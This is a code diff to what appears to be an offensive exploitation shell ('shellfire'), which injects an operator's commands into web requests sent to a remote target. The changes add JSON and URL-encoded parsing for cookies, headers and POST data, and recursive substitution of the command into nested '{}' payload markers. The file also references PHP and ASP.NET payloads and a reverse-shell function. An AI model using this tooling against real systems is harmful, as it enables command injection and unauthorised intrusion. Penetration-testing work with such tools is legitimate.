@@ -1,3 +1,4 @@
+import copy
 import json
 import os
 import readline
@@ -7,6 +8,7 @@ import socket
 import sys
 import threading
 import time
+import urllib.parse
 from shellfire.config import cfg, state
 from shellfire.plugin_collection import plugins
 from shellfire.payloads import get_aspnet_payload, get_php_payload
@@ -112,6 +114,30 @@ def rev_shell(addr, port):
   return
 
 
+def parse_to_dict(data):
+  if data[0] is "{":
+    ## try to parse as json encoded data
+    try:
+      return json.loads(data)
+    except Exception as e:
+      sys.stderr.write("[!] %s\n" % e)
+  else:
+    ## try to parse as url encoded data
+    try:
+      d = urllib.parse.parse_qs(data.strip())
+      ## flatten lists if they are of size 1
+      ## this is especially necessary for cookies
+      for k,v in d.items():
+        if len(v) == 1:
+          d[k] = v[0]
+      ## return our dict
+      return d
+    except Exception as e:
+      sys.stderr.write("[!] %s\n" % e)
+  ## if we failed to pase, return an empty dict
+  return {}
+
+
 def cmd_auth(cmd):
   ## configure HTTP Basic auth settings
   if len(cmd) > 1:
@@ -160,13 +186,11 @@ def cmd_cookies(cmd):
     sys.stdout.write("[*] Cookies: %s\n" % (json.dumps(cfg.cookies)))
     return
   ## grab our original input, sans our initial command
-  json_data = state.userinput[len(cmd[0]):]
-  ## parse our json data
-  try:
-    cfg.cookies = json.loads(json_data)
-  except Exception as e:
-    sys.stderr.write("[!] %s\n" % e)
-  sys.stdout.write("[*] Cookies set: %s\n" % json.dumps(cfg.cookies))
+  data = state.userinput[len(cmd[0]):].strip()
+  ## parse our data
+  cfg.cookies = parse_to_dict(data)
+  if cfg.cookies:
+    sys.stdout.write("[*] Cookies set: %s\n" % json.dumps(cfg.cookies))
   return
 
 
@@ -268,15 +292,12 @@ def cmd_headers(cmd):
     sys.stdout.write("[*] Set request headers back to default.\n")
     return
   ## grab our original input, sans our initial command
-  json_data = state.userinput[len(cmd[0]):]
-  ## custom header parsing next...
-  try:
-    cfg.headers = json.loads(json_data)
-  except Exception as e:
-    sys.stderr.write("[!] %s\n" % e)
-  ## Sanity check
-  sys.stdout.write("[*] Request headers are now: \n")
-  sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
+  data = state.userinput[len(cmd[0]):].strip()
+  ## parse our data
+  cfg.headers = parse_to_dict(data)
+  if cfg.headers:
+    sys.stdout.write("[*] Request headers are now: \n")
+    sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
   return
 
 
@@ -414,13 +435,11 @@ def cmd_post(cmd):
     sys.stdout.write("[*] POST data: %s\n" % json.dumps(cfg.post_data))
     return
   ## grab our original input, sans our initial command
-  json_data = state.userinput[len(cmd[0]):]
-  ## parse our json data
-  try:
-    cfg.post_data = json.loads(json_data)
-  except Exception as e:
-    sys.stderr.write("[!] %s\n" % e)
-  sys.stdout.write("[*] POST data set: %s\n" % json.dumps(cfg.post_data))
+  data = state.userinput[len(cmd[0]):].strip()
+  ## parse the data
+  cfg.post_data = parse_to_dict(data)
+  if cfg.post_data:
+    sys.stdout.write("[*] POST data set: %s\n" % json.dumps(cfg.post_data))
   return
 
 
@@ -470,6 +489,25 @@ def cmd_useragent(cmd):
   sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
   return
 
+def expand_payload(my_list, data):
+  ## if we have a dict, expand our marker tags `{}` recursively
+  if not isinstance(my_list, dict) and not isinstance(my_list, list):
+    return
+  if isinstance(my_list, dict):
+    ## process as a dict
+    for k, v in my_list.items():
+        if isinstance(my_list[k], dict) or isinstance(my_list[k], list):
+          expand_payload(my_list[k], data)
+        else:
+          my_list[k] = v.replace('{}', data)
+  else:
+    ## process as a list
+    for k, v in enumerate(my_list):
+        if isinstance(v, dict) or isinstance(v, list):
+          expand_payload(v, data)
+        else:
+          my_list[k] = v.replace('{}', data)
+  return
 
 def send_payload():
   ## execute our command to the remote target
@@ -491,19 +529,17 @@ def send_payload():
       query = cfg.url
 
     ## generate POST payloads
-    post_data = cfg.post_data.copy()
-    for k, v in post_data.items():
-      post_data[k] = v.replace('{}', cmd.strip())
+    post_data = copy.deepcopy(cfg.post_data)
+    expand_payload(post_data, cmd.strip())
 
     ## generate cookie payloads
-    cookie_data = cfg.cookies.copy()
-    for k, v in cookie_data.items():
-      cookie_data[k] = v.replace('{}', cmd.strip())
+    cookie_data = copy.deepcopy(cfg.cookies)
+    expand_payload(cookie_data, cmd.strip())
+    requests.utils.add_dict_to_cookiejar(state.requests.cookies, cookie_data)
 
     ## generate headers payloads
-    header_data = cfg.headers.copy()
-    for k, v in header_data.items():
-      header_data[k] = v.replace('{}', cmd.strip())
+    header_data = copy.deepcopy(cfg.headers)
+    expand_payload(header_data, cmd.strip())
 
     ## log debug info
     if state.args.debug:
@@ -514,11 +550,11 @@ def send_payload():
       sys.stdout.write("[D] Headers %s\n" % json.dumps(header_data))
     try:
       if cfg.method == "post":
-        r = requests.post(
+        r = state.requests.post(
             query,
             data=post_data,
             verify=False,
-            cookies=cookie_data,
+            # cookies=cookie_data,
             headers=header_data,
             auth=cfg.auth)
       elif cfg.method == "form":
@@ -541,7 +577,7 @@ def send_payload():
             except Exception as e:
               sys.stdout.write("[!] Error: %s\n" % (e))
         ## post our form data
-        r = requests.post(
+        r = state.requests.post(
             query,
             data=post_data,
             files=files,
@@ -550,7 +586,7 @@ def send_payload():
             headers=header_data,
             auth=cfg.auth)
       else:
-        r = requests.get(
+        r = state.requests.get(
             query,
             verify=False,
             cookies=cookie_data,
